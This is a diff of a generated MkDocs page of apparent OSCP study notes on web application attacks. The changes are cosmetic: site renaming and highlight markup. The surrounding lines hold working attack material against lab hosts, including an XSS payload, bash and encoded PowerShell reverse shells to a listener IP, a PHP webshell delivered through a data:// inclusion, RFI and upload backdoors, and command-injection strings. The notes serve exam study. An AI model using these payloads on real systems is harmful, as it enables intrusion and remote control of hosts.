@@ -20,12 +20,12 @@
         
       
       
-      <link rel="icon" href="assets/images/favicon.png">
+      <link rel="icon" href="assets/logo2.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
     
     
       
-        <title>Web Application Attacks - My site</title>
+        <title>Web Application Attacks - Charlie's OSCP Notes</title>
       
     
     
@@ -90,7 +90,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="index.html" title="My site" class="md-header__button md-logo" aria-label="My site" data-md-component="logo">
+    <a href="index.html" title="Charlie&#39;s OSCP Notes" class="md-header__button md-logo" aria-label="Charlie's OSCP Notes" data-md-component="logo">
       
   <img src="assets/logo2.png" alt="logo">
 
@@ -103,7 +103,7 @@
       <div class="md-header__ellipsis">
         <div class="md-header__topic">
           <span class="md-ellipsis">
-            My site
+            Charlie's OSCP Notes
           </span>
         </div>
         <div class="md-header__topic" data-md-component="header-topic">
@@ -147,12 +147,12 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="index.html" title="My site" class="md-nav__button md-logo" aria-label="My site" data-md-component="logo">
+    <a href="index.html" title="Charlie&#39;s OSCP Notes" class="md-nav__button md-logo" aria-label="Charlie's OSCP Notes" data-md-component="logo">
       
   <img src="assets/logo2.png" alt="logo">
 
     </a>
-    My site
+    Charlie's OSCP Notes
   </label>
   
   <ul class="md-nav__list" data-md-scrollfix>
@@ -1021,7 +1021,7 @@ before we use this we need to minify and encode it --&gt; we can do this using J
 let encoded = encode_to_javascript('insert_minified_javascript')
 console.log(encoded)
 </code></pre>
-<p>This loop will convert each character to the corresponding utf-16 integer code (==I Think we can do this in burp==)
+<p>This loop will convert each character to the corresponding utf-16 integer code (<mark>I Think we can do this in burp</mark>)
 Make sure we have burp proxy running with intercept on
 in terminal execute the following command</p>
 <pre><code class="language-shell">curl -i http://offsecwp --user-agent "&lt;script&gt;eval(String.fromCharCode(&lt;OUTPUT FROM PREVIOUS FUNCTION&gt;))&lt;/script&gt;" --proxy 127.0.0.1:8080
@@ -1139,7 +1139,7 @@ We can now send traffic to this address and change the command to run anything w
 Let's try a reverse shell:</p>
 <pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/192.168.119.3/4444 0&gt;&amp;1
 </code></pre>
-<p>==Note the above command won't work since php natively spawns a Bourne Shell (sh)==
+<p><mark>Note the above command won't work since php natively spawns a Bourne Shell (sh)</mark>
 To get php the runa  bash shell we ned to execute the following command</p>
 <pre><code class="language-sh">bash -c "bash -i &gt;&amp; /dev/tcp/192.168.119.3/4444 0&gt;&amp;1"
 </code></pre>
@@ -1186,11 +1186,11 @@ Sometimes web apps have filters for security and will filter on common attack co
 <pre><code class="language-shell">echo -n '&lt;?php echo system($_GET["cmd"]);?&gt;' | base64
 curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&amp;cmd=ls"
 </code></pre>
-<p>==data:// will not work with the default php installation== --&gt; we need <em>allow_url_include</em> setting to se be enabled</p>
+<p><mark>data:// will not work with the default php installation</mark> --&gt; we need <em>allow_url_include</em> setting to se be enabled</p>
 <h2 id="remote-file-inclusion-rfi">Remote File Inclusion (RFI)</h2>
 <p>RFI allows us to include files from a remote system over http or SMB. The included file is also executed in the context of the web application
 we can discover RFI vulnerabilities using the same techniques for directory traversal and lfi
-==Kali includes several php webshells under /usr/share/webshells/php== --&gt; these can be used for RFI
+<mark>Kali includes several php webshells under /usr/share/webshells/php</mark> --&gt; these can be used for RFI
 For this example we will use the simple-backdoor.php webshell which takes a command through the command parameter like the php snippet we used before
 we need to host the webshell somewhere so it is accessible --&gt; use <code>python3 http.server</code>
 we then use curl to invoke the rfi vuln</p>
@@ -1212,7 +1212,7 @@ Once we identify an upload mechanism we can start to probe it to see how well it
 <p>Once we upload a file we can use curl or navigate to the webpage to get it to execute</p>
 <pre><code class="language-shell">curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
 </code></pre>
-<p>==When executing commands on windows host make sure to use the correct slashes==</p>
+<p><mark>When executing commands on windows host make sure to use the correct slashes</mark></p>
 <p>If we know the underlying host is windows we can use Powershell one liners for reverse shells --&gt; since we have many special characters in this we need to encode it.
 The following powershell commands show how to do this in powershell</p>
 <pre><code class="language-PowerShell">pwsh
@@ -1228,7 +1228,7 @@ exit
 AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
 </code></pre>
 <p>This should allow us to receive a reverse shell in Netcat</p>
-<p>==If we can upload files to arbitrary parts of the system, we can upload files that are hosted by the website==
+<p><mark>If we can upload files to arbitrary parts of the system, we can upload files that are hosted by the website</mark>
 for example on an aspx website we can upload the cmdasp.apx web shell where the default website root is. Then we can navigate to the webshell and execute commands on the system --&gt; requires you to look up directory structure of underlying system and software to make sure you put it somewhere to navigate to</p>
 <h2 id="non-executable-files">Non Executable Files</h2>
 <p>In situations where we cannot execute an uploaded file we need to leverage other vulnerabilities to abuse the file upload mechanism --&gt; we can use Directory traversal for example
@@ -1260,7 +1260,7 @@ We can use a url encoded semi colon, %3B, to try and run multiple commands</p>
 <pre><code class="language-shell">curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
 </code></pre>
 <p>It works. Both commands were run --&gt; now we need to find out if we are in cmd or powershell
-==We can use the following command to determine if we are in cmd or powershell==</p>
+<mark>We can use the following command to determine if we are in cmd or powershell</mark></p>
 <pre><code>(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell
 </code></pre>
 <p>This will output what terminal we are in
@@ -1300,7 +1300,7 @@ $(&lt;command&gt;)
 
 </code></pre>
 <p>Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using <code>"</code> or <code>'</code>) before using suitable shell metacharacters to inject a new command.</p>
-<p>==Good Resource== https://github.com/payloadbox/command-injection-payload-list --&gt; we may need to encapsulate commands in special characters to get them to work
+<p><mark>Good Resource</mark> https://github.com/payloadbox/command-injection-payload-list --&gt; we may need to encapsulate commands in special characters to get them to work
 - try single and/or double quotes
 - try putting &amp; before bash commands</p>
 <h2 id="blind-injection">Blind Injection</h2>
@@ -1372,7 +1372,7 @@ special charatcers are still not chnaged so we may be able to idenitfy potential
 <p>use tools to decode</p>
 <h3 id="other-encodings">Other Encodings</h3>
 <p>There are hundreds of other encoding methods we can find online. Even though these are the most common, sometimes we will come across other encoding methods, which may require some experience to identify and decode.</p>
-<p>==If you face any similar types of encoding, first try to determine the type of encoding, and then look for online tools to decode it.==</p>
+<p><mark>If you face any similar types of encoding, first try to determine the type of encoding, and then look for online tools to decode it.</mark></p>
 <p>Some tools can help us automatically determine the type of encoding, like <a href="https://www.boxentriq.com/code-breaking/cipher-identifier">Cipher Identifier</a>. Try the encoded strings above with <a href="https://www.boxentriq.com/code-breaking/cipher-identifier">Cipher Identifier</a>, to see if it can correctly identify the encoding method.</p>
 <h1 id="injection-attacks">Injection Attacks</h1>
 <p>XPath Injection - XML Path Language is a query language for XML data, similar to how SQL is a query language for data. XPath is used to query data from XML documents. XPath Injection vulnerabilities arise when  user input is not properly sanitized</p>
@@ -1524,7 +1524,7 @@ We are appending a second query with the <code>|</code> operator, similar to a
 <pre><code class="language-xpath">/a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | /*[1]
 </code></pre>
 <p>The subquery <code>/*[1]</code> starts at the document root <code>/</code>, moves one node down the node tree due to the wildcard <code>*</code>, and selects the first child due to the predicate <code>[1]</code>Thus, this subquery selects the document root's first child, the document root element node. Since the document root element node has multiple child nodes, it is of the data type <code>array</code> in PHP, which we can confirm when analyzing the response. The web application expects a <code>string</code> but receives an <code>array</code> and is thus unable to print the results, resulting in an empty response.
-==We can now determine the schema depth by iteratively appending an additional <code>/*[1]</code> to the subquery until the behavior of the web application changes==</p>
+<mark>We can now determine the schema depth by iteratively appending an additional <code>/*[1]</code> to the subquery until the behavior of the web application changes</mark></p>
 <table>
 <thead>
 <tr>
@@ -1860,7 +1860,7 @@ Attackers should keep track of
 <p>Burp intruder can be used to brute force logins and look for a difference in responses</p>
 <p>If we run an intruder attack in Burp --&gt; right click on a result --&gt; grep-extract --&gt; highlight the error message. We can view the error message as part of the results and sort to see if any are different.</p>
 <p>when looking for a discrepancy in response time we can supply a long password (100+ character) to see if the app reacts differently.</p>
-<p>==We can spoof IP by providing the <code>X-Forwarded-For</code> header if supported== We can supply a simple number list as part of a pitchfork attack for this parameter</p>
+<p><mark>We can spoof IP by providing the <code>X-Forwarded-For</code> header if supported</mark> We can supply a simple number list as part of a pitchfork attack for this parameter</p>
 <h2 id="multi-factor-authentication">Multi Factor Authentication</h2>
 <p>it is increasingly common to see both mandatory and optional two-factor authentication (2FA) based on <strong>something you know</strong> and <strong>something you have</strong>. This usually requires users to enter both a traditional password and a temporary verification code from an out-of-band physical device in their possession.  Poorly implemented two-factor authentication can be beaten, or even bypassed entirely, just as single-factor authentication can.</p>
 <h2 id="bypassing-2fa">Bypassing 2FA</h2>
@@ -2248,7 +2248,7 @@ S3 Buckets are a storage service provided by Amazon AWS, allowing people to save
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": ".", "features": ["header.autohide"], "search": "assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": ".", "features": ["header.autohide", "navigation.tracking", "content.code.copy", "content.code.select"], "search": "assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
       <script src="assets/javascripts/bundle.79ae519e.min.js"></script>
